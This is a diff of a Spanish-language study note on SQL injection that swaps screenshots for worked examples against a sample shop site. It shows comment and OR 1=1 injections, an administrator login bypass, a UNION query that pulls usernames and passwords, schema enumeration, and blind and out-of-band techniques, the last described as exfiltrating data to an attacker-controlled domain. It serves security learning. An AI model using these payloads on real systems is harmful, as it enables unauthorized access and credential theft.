@@ -14,73 +14,108 @@ Un ataque exitoso puede resultar en el acceso sin autorizacion o la obtencion de
 
 ## Atacando la URI
 
-![](../../.gitbook/assets/imagen%20%28607%29.png)
+Supongamos que tenemos la siguiente URL que genera la siguiente consulta:
 
-Releleased es un atributo interno dentro de la aplicacion.
 
-Ahora si un atacante modificase el codigo de la uri para agregar un comentario y este input no es sanitizado ocurre lo siguiente
 
-![](../../.gitbook/assets/imagen%20%28593%29.png)
+```text
+https://insecure-website.com/products?category=Gifts
+```
 
-Comenta el codigo y revela informacion de objetos sin release.
+```sql
+SELECT * FROM products
+WHERE category = 'Gifts'
+AND released = 1
+```
 
-### Agregando una condicion para obtener todo
+Releleased es un atributo interno dentro de la aplicacion. Ahora si un atacante modificase el codigo de la uri para agregar un comentario y este input no es sanitizado ocurre lo siguiente
 
-![](../../.gitbook/assets/imagen%20%28603%29.png)
+```text
+https://insecure-website.com/products?category=Gifts'--
+```
+
+```sql
+SELECT * FROM products
+WHERE category = 'Gifts'--'AND released = 1
+```
+
+Comenta el codigo y revela informacion de objetos sin release. Mejorando su ataque el atacante podria obtener todos los productos incluido aquellos que no conoce.
+
+```text
+https://insecure-website.com/products?category=Gifts'+OR+1=1--
+```
+
+```sql
+SELECT * FROM products
+WHERE category = 'Gifts'
+OR 1=1--'AND released = 1
+```
 
 ## Atacando Log-In
 
-Que sucede cuando hacemos log in con nuestro user= wiener y nuestro pass= bluecheese
+Que sucede cuando hacemos log in con nuestro **user**= wiener y nuestro **pass**= bluecheese
 
-![](../../.gitbook/assets/imagen%20%28602%29.png)
+```sql
+SELECT * FROM users 
+WHERE username = 'wiener'
+AND password = 'bluecheese'
+```
 
 Curioso que pasaria si ponemos de usuario \(sin siquiera pas\) administrator'--
 
-![](../../.gitbook/assets/imagen%20%28611%29.png)
+```sql
+SELECT * FROM users 
+WHERE username = 'administrator' -- 'AND password = ''
+```
 
  `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
 
-## Obteniendo datos de otras tablas
+## Obteniendo datos de otras tablas \(UNION ATTACK\)
 
-Usando union lo sumamos a nuestra query.
+Usando union lo sumamos a nuestra query:
 
-![](../../.gitbook/assets/imagen%20%28604%29.png)
+```sql
+SELECT name, descriptiion FROM products
+WHERE category = 'Gifts'
+UNION SELECT username, password FROM users--
+```
 
 ## Obteniendo informacion de la base
 
-Algo relevante puede ser obtener informacion de la base a modo de seguir atacandola y obtener activos mas criticos.
-
-Se puede obtener informacion de las version:
+Algo relevante puede ser obtener informacion de la base a modo de seguir atacandola y obtener activos mas criticos. Se puede obtener informacion de las version:
 
 **En oracle:**
 
-```text
+```sql
 SELECT * FROM v$version
 ```
 
 Otra forma de obtener info es obtener a travez de esto:
 
-![](../../.gitbook/assets/imagen%20%28596%29.png)
+```sql
+SELECT * FROM information_schema.tables
+```
 
 ## Inyeccion a ciegas
 
-Cuando el atacante no sabe contra que motor de base de datos se esta enfrentando.
+Cuando el atacante no sabe contra que motor de base de datos se esta enfrentando. Podemos cambiar la query acorde a elementos logicos que revelan esto. Por ejemplo delays en las query que difieren entre motores.
 
-Podemos cambiar la query acorde a elementos logicos que revelan esto. Por ejemplo delays en las query que difieren entre motores.
+* Cambios de logica que den errores como dividir por 0.
+* Obligar a delays
+* Trigger out of band network interactions \(burp collaborator\): Exifltrar info poniendo informacion en un dominio controlado por nosotros.
 
-![](../../.gitbook/assets/imagen%20%28598%29.png)
+## **SQL injection in different parts of the query**
 
-Lo ultimo implica exifltrar info poniendo informacion en un dominio controlado por nosotros.
+La mayoria de las vulnerabilidades ocurren por las clausulas WHERE y SELECT. Estas inyecciones son reconocibles por los testers, pero, muchas tambien pueden ocurrir en otros segmenetos de la query:
 
-## Usando Burpsuit 
-
-Posee una tool que detecta inputs y busca inyectarle sql de forma automatica.
-
-![](../../.gitbook/assets/imagen%20%28600%29.png)
+*  En `UPDATE` dentro de los`WHERE`
+*  En `INSERT` dentro de los valores a insertar
+*  En `SELECT` dentro de las tablas o columnas.
+*  En `SELECT` dentro de los `ORDER BY`.
 
 ## Inyeccion de segundo orden
 
 ![](../../.gitbook/assets/imagen%20%28608%29.png)
 
-La diferencia radica en que en este ataque se mantiene el ataque persistido en la base, el siguiente usuario que entra lo sigue viendo.
+La diferencia radica en que en este ataque se mantiene el ataque persistido en la base y no actua directamente. En la imagen muestra como al registrarse coloca la inyeccion y luego al hacer la busqueda se ejecuta y cambia al administrador. No en el login sino al registrar usuario.
 
